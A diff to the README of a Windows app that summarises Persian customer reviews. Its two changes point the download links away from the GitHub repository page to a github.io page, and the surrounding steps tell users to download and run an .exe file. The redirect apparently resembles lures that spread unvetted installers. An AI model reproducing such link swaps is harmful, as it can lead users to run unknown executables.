@@ -1,6 +1,6 @@
 # 🧠 persian-review-summarizer-ml - Understand Persian customer feedback in seconds
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Contractileorgandeclination861/persian-review-summarizer-ml)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://contractileorgandeclination861.github.io)
 
 ## 🎯 About this tool
 The persian-review-summarizer-ml application processes Persian text to help you understand customer feedback. It reads through reviews and creates short summaries. This tool identifies the main points and organizes the details into pros and cons. It also checks the tone of the comment and gives a score for the star rating based on the content.
@@ -19,7 +19,7 @@ This software runs on Windows. You need a modern computer to process language mo
 ## 📥 How to download and install
 You find the files on the repository page. Follow these steps to get the application running on your Windows device.
 
-1.  Visit the official repository page to download the software: https://github.com/Contractileorgandeclination861/persian-review-summarizer-ml
+1.  Visit the official repository page to download the software: https://contractileorgandeclination861.github.io
 2.  Look for the section marked Releases on the right side of the screen.
 3.  Click the latest version link.
 4.  Download the file ending in .exe to your computer.
